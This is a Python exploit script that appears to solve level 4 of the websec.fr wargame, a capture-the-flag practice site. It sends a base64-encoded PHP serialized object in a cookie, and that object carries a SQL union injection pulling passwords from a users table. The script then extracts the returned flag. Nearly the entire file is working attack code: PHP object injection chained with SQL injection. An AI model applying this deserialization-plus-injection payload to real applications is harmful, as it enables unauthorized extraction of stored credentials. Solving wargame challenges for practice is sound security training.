import requests
import urllib.parse
import re


if __name__ == '__main__':
    # exploit decode value
    # O:3:"SQL":2:{s:5:"query";s:59:"select username from users union select password from users";s:4:"conn";N;}
    exploit = urllib.parse.quote(
        'TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NTk6InNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIHVuaW9uIHNlbGVjdCB'
        'wYXNzd29yZCBmcm9tIHVzZXJzIjtzOjQ6ImNvbm4iO047fQ=='
    )
    url = 'http://websec.fr/level04/index.php'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
    cookies = {'leet_hax0r': exploit}
    data = {'id': 500, 'submit': 'Go'}
    res = requests.post(url=url, headers=headers, cookies=cookies, proxies=proxies, data=data)

    pattern = r'WEBSEC{[^}]+}'
    match = re.search(pattern, res.text)

    if match:
        print('[+]FLAG is', match.group())
